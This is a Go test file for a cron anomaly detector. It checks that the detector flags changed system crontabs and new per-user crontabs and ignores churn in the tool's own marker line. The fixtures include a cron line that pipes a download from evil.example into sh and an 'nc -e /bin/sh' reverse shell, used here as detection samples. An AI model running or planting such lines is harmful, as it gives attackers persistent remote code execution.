package anomaly

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestCheckCronFirstRunBootstrapsSilently(t *testing.T) {
	baseDir := t.TempDir()
	etcCrontab := filepath.Join(t.TempDir(), "crontab")
	os.WriteFile(etcCrontab, []byte("0 * * * * /usr/bin/true\n"), 0o644)

	sources := []CronSource{{Path: etcCrontab}}
	findings, err := CheckCron(baseDir, sources, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 0 {
		t.Fatalf("expected no findings on first run, got %+v", findings)
	}
}

func TestCheckCronFlagsChangedSystemFile(t *testing.T) {
	baseDir := t.TempDir()
	etcCrontab := filepath.Join(t.TempDir(), "crontab")
	os.WriteFile(etcCrontab, []byte("0 * * * * /usr/bin/true\n"), 0o644)
	sources := []CronSource{{Path: etcCrontab}}

	if _, err := CheckCron(baseDir, sources, nil); err != nil {
		t.Fatal(err)
	}

	os.WriteFile(etcCrontab, []byte("0 * * * * /usr/bin/true\n* * * * * curl evil.example/x|sh\n"), 0o644)

	findings, err := CheckCron(baseDir, sources, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 1 || findings[0].Culprit != "" {
		t.Fatalf("expected one finding with no culprit (system file, not per-user), got %+v", findings)
	}
}

func TestCheckCronFlagsNewPerUserCrontabWithFilenameAsCulprit(t *testing.T) {
	baseDir := t.TempDir()
	spoolDir := t.TempDir()
	sources := []CronSource{{Path: spoolDir, IsDir: true, CulpritIsFilename: true}}

	if _, err := CheckCron(baseDir, sources, nil); err != nil {
		t.Fatal(err)
	}

	os.WriteFile(filepath.Join(spoolDir, "alovelace"), []byte("* * * * * nc -e /bin/sh attacker 4444\n"), 0o600)

	findings, err := CheckCron(baseDir, sources, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 1 || findings[0].Culprit != "alovelace" {
		t.Fatalf("expected one finding attributed to 'alovelace', got %+v", findings)
	}
}

func TestCheckCronNormalizeSuppressesWardensOwnLineChurn(t *testing.T) {
	baseDir := t.TempDir()
	rootCrontab := filepath.Join(t.TempDir(), "root")
	marker := "# svchelper-sentinel"

	stripMarker := func(path string, content []byte) []byte {
		var kept []string
		for _, line := range strings.Split(string(content), "\n") {
			if strings.Contains(line, marker) {
				continue
			}
			kept = append(kept, line)
		}
		return []byte(strings.Join(kept, "\n"))
	}

	os.WriteFile(rootCrontab, []byte("*/10 * * * * /usr/local/sbin/svchelper sentinel-check "+marker+"\n"), 0o600)
	sources := []CronSource{{Path: rootCrontab}}

	if _, err := CheckCron(baseDir, sources, stripMarker); err != nil {
		t.Fatal(err)
	}

	// Sentinel legitimately rewrites its own line (e.g. a path changed) —
	// the marker line's content itself churns, but nothing else does.
	os.WriteFile(rootCrontab, []byte("*/10 * * * * /usr/local/sbin/svchelper2 sentinel-check "+marker+"\n"), 0o600)

	findings, err := CheckCron(baseDir, sources, stripMarker)
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 0 {
		t.Fatalf("expected Warden's own marker-line churn to be suppressed, got %+v", findings)
	}
}
